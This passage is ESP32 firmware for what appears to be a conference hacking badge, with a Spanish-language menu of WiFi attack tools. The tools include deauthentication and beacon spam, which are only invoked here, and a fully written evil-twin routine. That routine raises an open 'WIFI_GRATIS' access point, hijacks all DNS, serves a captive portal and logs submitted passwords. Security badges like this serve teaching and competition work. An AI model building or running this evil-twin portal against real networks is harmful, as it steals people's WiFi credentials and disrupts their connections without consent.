    tft.drawRoundRect(8, 31, tft.width()-16, 16, 2, kPanel);
    tft.setTextColor(kText, kBg); tft.drawCentreString(in, tft.width()/2, 35, 1);
    const String md5 = md5Hex(in), sha = sha256Hex(in);
    tft.setTextColor(uiYellow, kBg); tft.drawString("MD5", 10, 50, 1);
    tft.setTextColor(kText, kBg); tft.drawString(md5.substring(0,16), 10, 60, 1); tft.drawString(md5.substring(16), 10, 70, 1);
    tft.setTextColor(uiCyan, kBg); tft.drawString("SHA256", 10, 82, 1);
    tft.setTextColor(kText, kBg); tft.drawString(sha.substring(0,16), 10, 92, 1); tft.drawString(sha.substring(16,32), 10, 102, 1);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("ANY: FUENTE EXT:VOLVER", tft.width()/2, 118, 1);
}

void drawLogsTool() {
    tft.fillScreen(kBg); clearPadPixels();
    tft.drawRect(0, 0, tft.width(), tft.height(), kLine);
    tft.setTextColor(uiRed, kBg); tft.drawCentreString("LOGS", tft.width()/2, 2, 2);
    tft.setTextColor(kDim, kBg); tft.drawCentreString("Eventos del badge", tft.width()/2, 18, 1);
    tft.drawFastHLine(8, 28, tft.width()-16, kLine);
    
    int s2 = g_log_offset, e2 = min((int)g_log_count, s2 + 6);
    int y = 31;
    for(int i=s2; i<e2; ++i){
        tft.drawRoundRect(8, y, tft.width()-20, 12, 2, kPanel); 
        tft.setTextColor(kText, kBg); tft.drawString(g_logs[i], 12, y+2, 1);
        y += 14;
    }
    
    if(g_log_count > 6) {
        int bar_h = max(10, (6 * 80) / g_log_count);
        int bar_y = 31 + (s2 * (80 - bar_h)) / (g_log_count - 6);
        tft.fillRect(tft.width()-6, bar_y, 4, bar_h, uiRed);
    }

    if(g_log_count==0){ tft.setTextColor(uiYellow, kBg); tft.drawCentreString("Sin logs", tft.width()/2, 60, 1); }
    tft.setTextColor(kDim, kBg); tft.drawCentreString("SEL:LIMPIAR EXT:VOLVER", tft.width()/2, 118, 1);
}

void redraw() { if(g_blink_dirty && g_view==VIEW_BOOT) { drawBootBlink(); g_blink_dirty=false; } if(!g_full_redraw) return; switch(g_view){ case VIEW_BOOT: drawBootStatic(); drawBootBlink(); g_blink_dirty=false; break; case VIEW_MENU: drawMenu(); break; case VIEW_WIFI_SCAN: drawWifiScan(); break; case VIEW_TWIN_DETECT: drawTwinDetect(); break; case VIEW_WIFI_DEAUTH: drawWifiDeauth(); break; case VIEW_EVILTWIN: drawEvilTwin(); break; case VIEW_BEACON_SPAM: drawBeaconSpam(); break; case VIEW_HASH_TOOL: drawHashTool(); break; case VIEW_LOGS_TOOL: drawLogsTool(); break; } g_full_redraw=false; }
void goMenu(){ g_view=VIEW_MENU; g_menu_sel=0; g_boot_drawn=false; g_full_redraw=true; }
void goWifiScan(){ g_view=VIEW_WIFI_SCAN; g_scan_offset=0; g_full_redraw=true; tft.fillScreen(kBg); clearPadPixels(); tft.setTextColor(uiRed,kBg); tft.drawCentreString("WIFI SCAN",tft.width()/2,50,2); tft.setTextColor(uiYellow,kBg); tft.drawCentreString("Escaneando...",tft.width()/2,80,1); if(WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA); const int found=WiFi.scanNetworks(false,true); g_scan_count=(found<0)?0:found; addLog("SCAN:"+String(g_scan_count)+"nets"); }
void goTwinDetect(){ g_view=VIEW_TWIN_DETECT; g_twin_offset=0; g_twin_count=0; g_full_redraw=true; tft.fillScreen(kBg); clearPadPixels(); tft.setTextColor(uiRed,kBg); tft.drawCentreString("TWIN DETECT",tft.width()/2,50,2); tft.setTextColor(uiYellow,kBg); tft.drawCentreString("Buscando twins...",tft.width()/2,80,1); if(WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA); const int found=WiFi.scanNetworks(false,true); g_scan_count=(found<0)?0:found; }
void goWifiDeauth(){ WifiDeauthTool::init(); g_view=VIEW_WIFI_DEAUTH; g_full_redraw=true; addLog("DEAUTH init"); }
void goEvilTwin(){ eviltwin_active=true; g_view=VIEW_EVILTWIN; g_full_redraw=true; initEvilTwin(); }
void goBeaconSpam(){ g_view=VIEW_BEACON_SPAM; BeaconSpamTool::enabled=false; if(WiFi.getMode()==WIFI_OFF) WiFi.mode(WIFI_STA); g_full_redraw=true; addLog("BSPAM init"); }
void goHashTool(){ g_view=VIEW_HASH_TOOL; g_hash_source=0; g_full_redraw=true; addLog("HASH"); }
void goLogsTool(){ g_view=VIEW_LOGS_TOOL; g_log_offset=0; g_full_redraw=true; }

void handleBootInput(){ if(pressed(BTN_SELECT)) { addLog("BOOT->MENU"); goMenu(); } }
void handleMenuInput(){ if(menuPressed(BTN_EXTRA)){ g_view=VIEW_BOOT; g_boot_drawn=false; g_blink_state=true; g_blink_dirty=false; g_full_redraw=true; return; } if(menuPressed(BTN_UP)||menuPressed(BTN_LEFT)){ g_menu_sel=(g_menu_sel+kMenuItems-1)%kMenuItems; g_full_redraw=true; return; } if(menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT)){ g_menu_sel=(g_menu_sel+1)%kMenuItems; g_full_redraw=true; return; } if(menuPressed(BTN_SELECT)){ switch(g_menu_sel){ case 0:goWifiScan();break; case 1:goTwinDetect();break; case 2:goWifiDeauth();break; case 3:goEvilTwin();break; case 4:goBeaconSpam();break; case 5:goHashTool();break; case 6:goLogsTool();break; } } }
void handleWifiScanInput(){ if(menuPressed(BTN_EXTRA)){WiFi.scanDelete();g_scan_count=0;goMenu();return;} if(menuPressed(BTN_SELECT)){goWifiScan();return;} if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&g_scan_count>0&&(int)(g_scan_offset+kScanPageSize)<g_scan_count){g_scan_offset+=kScanPageSize;g_full_redraw=true;} if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_scan_offset>=kScanPageSize){g_scan_offset-=kScanPageSize;g_full_redraw=true;} }
void handleTwinDetectInput(){ if(menuPressed(BTN_EXTRA)){WiFi.scanDelete();g_scan_count=0;g_twin_count=0;goMenu();return;} if(menuPressed(BTN_SELECT)){goTwinDetect();return;} if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&(int)(g_twin_offset+2)<g_twin_count){g_twin_offset+=2;g_full_redraw=true;} if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_twin_offset>=2){g_twin_offset-=2;g_full_redraw=true;} }

void handleWifiDeauthInput(){ 
    WifiDeauthTool::tick(); 
    if(menuPressed(BTN_EXTRA)){WifiDeauthTool::enabled=false;goMenu();return;} 
    
    int idx=-1; 
    for(int i=0;i<16;++i){ 
        if(!WifiDeauthTool::networks[i].ssid.length()) break; 
        if(bytesToStr(WifiDeauthTool::selectedNetwork.bssid,6)==bytesToStr(WifiDeauthTool::networks[i].bssid,6)){idx=i;break;} 
    } 
    
    if(menuPressed(BTN_UP)||menuPressed(BTN_LEFT)){
        if(idx>0){
            WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[idx-1];
            if(idx-1 < WifiDeauthTool::list_offset) WifiDeauthTool::list_offset = idx-1; 
            g_full_redraw=true;
        }
        return;
    } 
    
    if(menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT)){
        if(idx>=0 && idx<15 && WifiDeauthTool::networks[idx+1].ssid.length()){
            WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[idx+1];
            if(idx+1 >= WifiDeauthTool::list_offset + 5) WifiDeauthTool::list_offset = (idx+1) - 4; 
            g_full_redraw=true;
        }
        return;
    } 
    
    if(menuPressed(BTN_SELECT)){ 
        if(idx==-1 && WifiDeauthTool::networks[0].ssid.length()){
            WifiDeauthTool::selectedNetwork=WifiDeauthTool::networks[0];
        }
        WifiDeauthTool::enabled = !WifiDeauthTool::enabled; 
        g_full_redraw=true;
    } 
}

void handleBeaconSpamInput() {
    BeaconSpamTool::tick();
    if(menuPressed(BTN_EXTRA)){BeaconSpamTool::enabled=false; goMenu(); return;}
    if(menuPressed(BTN_SELECT)){
        BeaconSpamTool::enabled = !BeaconSpamTool::enabled;
        g_full_redraw=true;
    }
}

void handleHashToolInput(){ if(menuPressed(BTN_EXTRA)){goMenu();return;} if(menuPressed(BTN_UP)||menuPressed(BTN_DOWN)||menuPressed(BTN_LEFT)||menuPressed(BTN_RIGHT)||menuPressed(BTN_SELECT)){g_hash_source=(g_hash_source+1)%3;g_full_redraw=true;} }

void handleLogsToolInput(){ 
    if(menuPressed(BTN_EXTRA)){goMenu();return;} 
    if(menuPressed(BTN_SELECT)){g_log_count=0;g_log_offset=0;saveLogs();g_full_redraw=true;return;} 
    if((menuPressed(BTN_DOWN)||menuPressed(BTN_RIGHT))&&(int)(g_log_offset+6)<g_log_count){++g_log_offset;g_full_redraw=true;} 
    if((menuPressed(BTN_UP)||menuPressed(BTN_LEFT))&&g_log_offset>0){--g_log_offset;g_full_redraw=true;} 
}

void updateAnimation(){ if(g_view!=VIEW_BOOT) return; const uint32_t now=millis(); if((now-g_blink_ms)>=500){ g_blink_ms=now; g_blink_state=!g_blink_state; g_blink_dirty=true; } }

void setupDisplay(){ tft.init(); tft.setRotation(3); tft.fillScreen(kBg); initColors(); clearPadPixels(); WiFi.mode(WIFI_OFF); }

void setup(){ Serial.begin(115200); delay(80); setupHardware(); setupDisplay(); g_prefs_ready=g_prefs.begin("redr4ven",false); loadLogs(); Serial.println("REDR4VEN badge v12 - ROOTEDCON"); addLog("ARRANQUE OK"); g_view=VIEW_BOOT; g_full_redraw=true; g_blink_state=true; g_blink_ms=millis(); }

void loop(){ 
    updateButtons(); 
    updateAnimation(); 
    switch(g_view){ 
        case VIEW_BOOT:handleBootInput();break; 
        case VIEW_MENU:handleMenuInput();break; 
        case VIEW_WIFI_SCAN:handleWifiScanInput();break; 
        case VIEW_TWIN_DETECT:handleTwinDetectInput();break; 
        case VIEW_WIFI_DEAUTH:handleWifiDeauthInput();break; 
        case VIEW_EVILTWIN:handleEvilTwinInput();loopEvilTwin();break; 
        case VIEW_BEACON_SPAM:handleBeaconSpamInput();break;
        case VIEW_HASH_TOOL:handleHashToolInput();break; 
        case VIEW_LOGS_TOOL:handleLogsToolInput();break; 
    } 
    redraw(); 
    delay(8); 
}

void initEvilTwin() {
    eviltwin_active = true;
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP("WIFI_GRATIS", NULL, 6, 0, 4); 
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    evilServer.on("/", HTTP_GET, []() { evilServer.send(200, "text/html", captive_html); });
    evilServer.on("/login", HTTP_POST, []() {
        if(evilServer.hasArg("pass")) { addLog("PW: " + evilServer.arg("pass")); }
        evilServer.send(200, "text/html", "<html><body style='background:#222;color:#fff;text-align:center;margin-top:50px;'><h2>OK. Puede cerrar la ventana.</h2></body></html>");
    });
    evilServer.onNotFound([]() {
        evilServer.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
        evilServer.send(302, "text/plain", "");
    });
    evilServer.begin();
    addLog("EVILTWIN ON");
}
void loopEvilTwin() { dnsServer.processNextRequest(); evilServer.handleClient(); }
void handleEvilTwinInput() { if(menuPressed(BTN_EXTRA)){ eviltwin_active=false; WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF); dnsServer.stop(); evilServer.stop(); addLog("EVIL OFF"); goMenu(); } }